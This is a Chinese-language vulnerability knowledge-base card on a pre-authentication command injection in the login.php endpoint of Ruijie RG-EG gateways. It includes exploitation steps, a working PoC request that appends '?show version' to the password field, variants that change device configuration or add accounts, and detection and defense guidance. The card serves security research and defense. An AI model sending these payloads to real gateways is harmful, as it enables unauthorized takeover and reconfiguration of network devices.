---
id: iot-ruijie-rg-eg-login-webmaster-device-cli-command-injection
title: 锐捷 RG-EG 网关登录接口命令注入：username/password 拼接 webmaster 设备命令，`?` 分隔执行任意 CLI 命令
type: scenario
domain: iot
path: iot
technique: ruijie-rg-eg-login-webmaster-cli-injection
tags:
- iot
- router
- gateway
- ruijie
- command-injection
- php
- preauth
- web-admin
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V535
  verified_at: '2026-11-11T17:40:25+08:00'
  notes: 已对照原文全文与15张截图(img_small)核对：图01 Ruijie EG易网关WEB管理系统登录页；图02 Burp POST /login.php username=123&password=123123返回{"data":"1","status":1}；图03/04/05/06 login.php indexAction源码：p(username)/p(password)、仅===FALSE判空、execCli("exec","webmaster $username $password")、status!=1时json_echo及结尾$res['data']=$isSuccess;json_echo($res)；图07/09 execCli源码：php_exec_cli扩展存在性判断与@dl('client.so')、$data['data']=php_exec_cli(...)、status=1；图10 箭头指向dl(client.so)动态加载；图11 锐捷客服咨询设备命令；图12 百度show命令资料；图13/14 拼接示意webmaster abc bcd?show version；图15 Burp POST username=abc&password=bcd?show+version(Content-Length 38)响应data含WORD/System description/EG_RGOS 11.1(1)B1/serial H1JA0VP0009B/status 1，与卡中PoC及响应节选一致。卡中路由、参数、sink、回显字段、?分隔注入原理均与原文/截图一致；未设affected_versions正确(EG_RGOS 11.1(1)B1仅为实测目标版本，非影响范围)。dedup候选锐捷EW系列ufm_popen(CVE-2023-34644)、D-Link、瑞斯康达等均为不同产品线/入口/命令层，非同链；dup-scan无涉及pair。卡片原子，保留verified。未对真实设备执行请求。
url: /docs/iot/iot-ruijie-rg-eg-login-webmaster-device-cli-command-injection/
draft: false
kb_aliases:
- 锐捷 RG-EG 命令注入
- EG 易网关 RCE
- login.php webmaster
- php_exec_cli
- execCli 命令注入
- 设备 CLI 命令注入
- 网关登录处命令执行
---

## 一句话结论

锐捷 RG-EG 系列出口网关的 Web 管理端登录接口 `POST /login.php` 把 `username`、`password` 原样拼进设备命令 `webmaster $username $password`，再经 `execCli()` → `php_exec_cli()`（client.so）交给网关设备 CLI 执行；攻击者无需认证，在 password 中用 `?` 分隔即可追加任意设备命令（如 `password=bcd?show version`），命令输出随登录响应的 JSON `data` 字段回显，形成前台无条件命令执行。

## 原理

- **登录逻辑把凭据拼进设备命令**：`login.php` 的 `indexAction()` 用 `p("username")`/`p("password")` 取参后，仅判断 `=== FALSE`（并未真正判空），随即执行 `$res = execCli("exec", "webmaster $username $password");`。`webmaster` 是网关设备 CLI 中用于校验 Web 管理员账号的口令命令，预期返回 `0` 表示成功。
- **execCli/php_exec_cli 是设备命令执行通道**：`execCli()` 在确认 `php_exec_cli` 扩展存在后调用 `php_exec_cli($command, $mode, $answer)`；若扩展未加载则 `dl('client.so')` 动态加载。也就是说，PHP 层只是把命令字符串交给设备本地的 CLI 通信模块，命令最终由网关设备命令解释器执行，而非普通 Linux shell。
- **为什么 `?` 能注入**：设备 CLI 支持用 `?` 分隔多条命令（作用类似 Linux 的管道/`||`）。拼出的 `webmaster abc bcd?show version` 在设备侧被解释为两条命令：先执行 `webmaster abc bcd` 做认证，再执行 `show version`；`show` 类命令只读、无副作用，适合验证。
- **为什么能回显**：`execCli` 把 `php_exec_cli` 的返回值放进 `$data["data"]` 返回，`login.php` 在状态非 1（或后续流程）时把 `$res` 直接 `json_echo` 给前端；因此注入命令的标准输出会原样出现在 HTTP 响应的 `data` 字段里。
- **危害放大**：设备 CLI 不只是 `show`，还可以修改 IP、路由、账号、配置等；同一个注入点可被用于信息收集（`show version`/`show running-config`）、篡改网络配置、留后门。原文判断不少网络设备厂商的 Web 管理端都有类似的“用设备命令校验账号密码”的实现。

## 触发条件

- 目标为锐捷 RG-EG 系列出口网关，Web 管理端 `login.php` 可访问（LAN 侧或公网暴露的管理界面）。
- 登录接口未做客户端认证（登录前即可访问），且 `username`/`password` 未做命令转义/白名单。
- 设备 CLI 支持 `?` 命令分隔（原文实测型号/固件支持；不同型号可能分隔符不同）。
- 攻击者能向 `/login.php` 发送 POST 表单。

## 利用步骤

1. 访问 `http://target/`，确认是“EG 易网关 WEB 管理系统”登录页。
2. 抓取登录请求：`POST /login.php`，`Content-Type: application/x-www-form-urlencoded`，body 为 `username=<user>&password=<pass>`。
3. 构造 payload：`username=abc&password=bcd?show version`（空格用 `+` 或 `%20`），也可以换成 `?show running-config` 等设备命令。
4. 发送请求，响应 JSON 的 `data` 字段中出现 `show version` 的输出（System description、software version、serial number 等）。
5. 按需替换为其他设备 CLI 命令（修改配置/加账号等）；操作前确认命令语义，避免破坏设备。

## PoC

```http
POST /login.php HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Content-Length: 38

username=abc&password=bcd?show+version
```

响应（节选，原文截图）：

```json
{
  "data": "WORD\r\n\r\nSystem description      : Ruijie EASY GATEWA...\r\n                        by Ruijie Networks.\r\nSystem start time       : ...\r\nSystem uptime           : ...\r\nSystem hardware version  : 2.20\r\nSystem software version  : EG_RGOS 11.1(1)B1\r\nSystem serial number    : H1JA0VP000...\r\nSystem boot version     : 1.2.11",
  "status": 1
}
```

命令拼接过程（原文示意）：

```text
username = abc
password = bcd?show version
拼接命令: webmaster abc bcd?show version
设备执行: webmaster abc bcd
          show version
```

## 变体与关联

- **命令变体**：`show version`/`show running-config`/`show webmaster` 等信息收集；也可尝试修改接口 IP、路由、管理账号等配置类命令（需确认型号命令集）。
- **分隔符变体**：不同设备/固件可能支持 `?`、`;`、`|`、换行等分隔方式；需按实际 CLI 行为测试。
- **参数位置变体**：username 同样可控且先于 password 拼接，可尝试在 username 中注入；password 在尾部，通常更容易控制命令结尾。
- **同类设备**：锐捷 EW 系列 luci API 的 `ufm_popen` 注入（CVE-2023-34644，见 [[iot-ruijie-eweb-api-auth-merge-jsonrpc-ufm-popen-cmd-injection]]）是不同产品线、不同入口；其它网络设备 Web 管理端命令注入见 [[iot-raisecom-msg2200-t4-list-base-config-template-command-injection]]、[[iot-dlink-dir820l-ping-ccp-ping-addr-command-injection]]。

## 检测与防御

- **检测（Web 日志）**：`POST /login.php` 的表单中 username/password 含 `?`、`;`、`|`、`show `、`running-config` 等设备命令关键字；登录失败响应体却包含设备版本/配置信息；同一来源短时间内多次带特殊字符的登录请求。
- **检测（响应/流量）**：登录接口 JSON `data` 中出现 `System description`、`show ` 命令输出、配置片段；响应长度异常增大。
- **防御**：登录处理不要用设备 CLI 校验密码；对 username/password 做严格白名单（账号/密码字符集）与转义；改用专用认证 API 或本地 PAM/数据库校验；管理面限制来源 IP、禁止公网暴露；升级厂商修复固件。
